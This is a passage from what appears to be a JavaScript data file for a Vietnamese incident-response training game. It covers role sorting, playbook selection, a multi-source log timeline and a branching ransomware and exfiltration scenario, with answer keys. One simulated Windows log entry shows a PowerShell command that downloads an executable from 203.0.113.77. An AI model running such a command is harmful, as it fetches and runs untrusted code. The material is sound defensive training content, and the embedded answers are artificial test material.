  bins: [['ch', 'Chỉ huy sự cố', '#e11d48'], ['pt', 'Phân tích (SOC/IT)', '#2563eb'], ['kt', 'Kỹ thuật hệ thống', '#0d9488'], ['ht', 'Chủ hệ thống (nghiệp vụ)', '#7c3aed'], ['pc', 'Pháp chế – báo cáo', '#f97316']],
  items: [
    ['Quyết định mức SEV và phê duyệt ngắt mạng', 'ch'], ['Đọc log, dựng dòng thời gian', 'pt'], ['Tính SHA-256 và ghi chuỗi bàn giao bằng chứng', 'pt'],
    ['Khoá tài khoản, chặn địa chỉ trên tường lửa', 'kt'], ['Khôi phục từ bản sao lưu và kiểm tra lại', 'kt'],
    ['Đánh giá ảnh hưởng khi dừng hệ thống văn bản', 'ht'], ['Xác định văn bản nào có thể đã bị lộ', 'ht'], ['Soạn báo cáo gửi cấp có thẩm quyền theo quy định', 'pc']
  ] });

/* ---------- 19. Playbook ---------- */
G.push({ id: 'playbook', cd: 6, type: 'sort', ic: 'book', c: '#7c3aed', t: 'Chọn đúng playbook', d: 'Đọc tín hiệu, chọn playbook xử lý.',
  intro: 'Tín hiệu nào → playbook nào?',
  bins: [['rw', 'Ransomware', '#dc2626'], ['ph', 'Phishing', '#f97316'], ['ac', 'Chiếm tài khoản', '#7c3aed'], ['web', 'Tấn công web', '#2563eb'], ['lk', 'Lộ lọt dữ liệu', '#0d9488']],
  items: [
    ['820 tệp trên máy chủ tệp đổi đuôi .lock, có tệp HUONG_DAN_KHOI_PHUC.txt', 'rw'], ['Bản sao bóng (shadow copy) bị xoá bằng vssadmin', 'rw'],
    ['7 hộp thư nhận cùng một thư có tệp .html, 1 người đã nhập mật khẩu', 'ph'],
    ['Đăng nhập thành công lúc 02:00 từ địa chỉ nước ngoài, MFA bị từ chối 15 lần rồi chấp nhận', 'ac'], ['Một tài khoản đăng nhập từ hai quốc gia cách nhau 19 phút', 'ac'],
    ['Hàng trăm lỗi 404 rồi một lỗi 500 trên cổng thông tin', 'web'],
    ['Máy chủ văn bản gửi 2 GB tới địa chỉ lạ trong 18 phút', 'lk'], ['Kho lưu trữ đám mây chứa danh sách cán bộ để chế độ công khai', 'lk']
  ] });

/* ---------- 20. Dòng thời gian ---------- */
G.push({ id: 'timeline', cd: 6, type: 'order', ic: 'clock', c: '#2563eb', t: 'Dựng dòng thời gian từ 4 nguồn log', d: 'Xếp 8 bản ghi lẫn lộn từ Windows, Wazuh, Suricata, netflow.',
  intro: 'Các bản ghi bị trộn lẫn và giờ được viết theo nhiều định dạng khác nhau. Xếp lại theo thời gian thực (cùng múi giờ +07:00).',
  showTime: true,
  items: [
    ['Windows 4625 × 176 từ 198.51.100.23', '2026-11-07T09:10:04+07:00'],
    ['Windows 4624 nguyen.thu.ha LogonType 10', '07/11/2026 09:13:07'],
    ['Windows 4688 powershell … iwr http://203.0.113.77/s.exe', '1794017772 (giây epoch UTC)'],
    ['Wazuh FIM: 14 tệp D:\\VanBan\\Den\\2026-11 bị sửa', '2026-11-07 02:18:02 UTC'],
    ['Suricata SID 1000001 từ 10.20.20.12', 'Nov 7 09:20:31'],
    ['Netflow 10.20.1.21 → 203.0.113.77:443 bắt đầu', '07/11 09:21:10'],
    ['Windows 4720 tạo tài khoản hotro.it2', '2026-11-07T02:24:03Z'],
    ['Windows 1102 nhật ký bảo mật bị xoá', '07/11/2026 09:41:55']
  ],
  lesson: 'Luôn quy đổi về cùng một múi giờ trước khi xếp. 02:18 UTC = 09:18 giờ Việt Nam.' });

/* ---------- 21. Dữ kiện hay giả thuyết ---------- */
G.push({ id: 'dukien', cd: 6, type: 'sort', ic: 'search', c: '#0d9488', t: 'Dữ kiện hay giả thuyết?', d: 'Phân biệt điều đã thấy trong log với điều cần xác minh.',
  intro: 'Báo cáo sự cố phải tách rõ hai loại câu.',
  bins: [['f', 'DỮ KIỆN (có trong log)', '#16a34a'], ['h', 'GIẢ THUYẾT (cần xác minh)', '#f59e0b']],
  items: [
    ['Lúc 09:13:07 có sự kiện 4624 của nguyen.thu.ha từ 198.51.100.23', 'f'], ['Kẻ tấn công là một nhóm có tổ chức ở nước ngoài', 'h'],
    ['14 tệp trong D:\\VanBan\\Den\\2026-11 bị thay đổi lúc 09:18', 'f'], ['Các tệp đã bị mã hoá', 'h', 'FIM chỉ cho biết tệp thay đổi, chưa cho biết bị mã hoá.'],
    ['Cảnh báo 09:20 là một phần của cuộc tấn công', 'h', 'Khác nguồn (10.20.20.12) – cần xác minh.'], ['Có khoảng 2.033 MB đi từ 10.20.1.21 tới 203.0.113.77', 'f'],
    ['Dữ liệu gửi đi là văn bản mật', 'h'], ['Nhật ký bảo mật SRV-VB01 bị xoá lúc 09:41:55', 'f']
  ] });

/* ---------- 22. Tình huống phân nhánh ---------- */
G.push({ id: 'sucoso', cd: 6, type: 'branch', ic: 'flash', c: '#b91c1c', t: '60 phút đầu tiên', d: 'Diễn tập ra quyết định: mỗi lựa chọn ảnh hưởng tới thiệt hại, bằng chứng và dịch vụ.',
  intro: 'Sáng thứ Bảy 07/11/2026, 09:45. Đồng chí trực an ninh mạng nhận cảnh báo “The audit log was cleared” trên SRV-VB01. Các quyết định của đồng chí sẽ được chấm theo 3 thước đo.',
  nodes: {
    s: { t: '09:45 – Cảnh báo mức 12 trên Wazuh: nhật ký bảo mật SRV-VB01 vừa bị xoá. Đồng chí làm gì đầu tiên?',
      o: [['Mở phiếu sự cố, ghi giờ, báo Chỉ huy sự cố; đồng thời xem log đã đẩy về Wazuh', 'a', { d: 0, e: 10, s: 0 }, 'Đúng quy trình: có phiếu, có người chỉ huy; log trên SIEM vẫn còn dù máy đã xoá.'],
          ['Đăng nhập ngay vào SRV-VB01 để xem chuyện gì xảy ra', 'b', { d: 5, e: -15, s: 0 }, 'Đăng nhập trực tiếp làm thay đổi trạng thái máy và có thể lộ tài khoản quản trị nếu kẻ gian còn trong máy.'],
          ['Chờ sáng thứ Hai báo cáo vì là ngày nghỉ', 'x', { d: 40, e: -5, s: 0 }, 'Kẻ tấn công có trọn hai ngày.']] },
    a: { t: '09:52 – Trên Wazuh thấy: 4625 × 176 từ 198.51.100.23 (09:10), 4624 nguyen.thu.ha (09:13), FIM 14 tệp (09:18), tài khoản hotro.it2 được tạo (09:24). Netflow cho thấy 10.20.1.21 vẫn đang gửi dữ liệu ra 203.0.113.77. Đề xuất ngăn chặn?',
      o: [['Đề nghị Chỉ huy phê duyệt: chặn 203.0.113.77 và 198.51.100.23 trên tường lửa, vô hiệu hoá quy tắc 14 (RDP), khoá nguyen.thu.ha và hotro.it2', 'c', { d: -10, e: 0, s: -5 }, 'Cắt đường đánh cắp và lối vào, ảnh hưởng nghiệp vụ nhỏ (thứ Bảy).'],
          ['Tắt nguồn SRV-VB01 ngay', 'd', { d: -10, e: -20, s: -20 }, 'Dừng được đánh cắp nhưng mất bộ nhớ RAM (bằng chứng) và gián đoạn hệ thống văn bản.'],
          ['Chưa làm gì, tiếp tục theo dõi để thu thêm bằng chứng', 'e', { d: 25, e: 5, s: 0 }, 'Dữ liệu tiếp tục bị gửi ra ngoài.']] },
    b: { t: '09:55 – Đồng chí đã đăng nhập vào SRV-VB01 bằng tài khoản quản trị. Thấy tệp C:\\Users\\Public\\sync_tool.exe. Bây giờ?',
      o: [['Dừng thao tác trên máy, báo Chỉ huy, chuyển sang phân tích trên Wazuh và netflow', 'a', { d: 0, e: 0, s: 0 }, 'Sửa sai kịp thời.'],
          ['Xoá sync_tool.exe cho nhanh', 'e', { d: 5, e: -20, s: 0 }, 'Mất mẫu mã độc – bằng chứng quan trọng.']] },
    x: { t: 'Thứ Hai 09/11, 08:00 – Người dùng báo không mở được văn bản; netflow cho thấy dữ liệu đã đi ra suốt cuối tuần.', end: true },
    c: { t: '10:10 – Đã ngăn chặn. Tiếp theo?',
      o: [['Thu bằng chứng: xuất log, sao bộ nhớ, tính SHA-256, ghi chuỗi bàn giao; sau đó khôi phục từ bản sao lưu sạch trước 07/11, đổi mật khẩu, bật MFA, kiểm tra lại', 'f', { d: -5, e: 15, s: 10 }, 'Đủ bước: bằng chứng → loại bỏ → khôi phục → kiểm tra lại.'],
          ['Khôi phục ngay để kịp làm việc thứ Hai, bằng chứng tính sau', 'f2', { d: 0, e: -15, s: 10 }, 'Khôi phục đè lên máy làm mất bằng chứng.']] },
    d: { t: '10:00 – Máy đã tắt. Thứ Hai cả cơ quan không dùng được hệ thống văn bản.', end: true },
    e: { t: '10:30 – Dữ liệu tiếp tục bị gửi ra ngoài trong khi đồng chí chờ.', end: true },
    f: { t: 'Hoàn tất. Báo cáo sau sự cố gồm: dòng thời gian (tách dữ kiện/giả thuyết), phạm vi, bằng chứng, quyết định và người phê duyệt, bài học: đóng quy tắc RDP tạm, bật MFA, thu hồi tài khoản nghỉ hưu.', end: true },
    f2: { t: 'Hệ thống chạy lại, nhưng không còn bằng chứng để xác định văn bản nào đã bị lộ.', end: true }
  } });

window.GAMES = G;
window.PRAC_KEYS = G.map(g => g.id);
})();
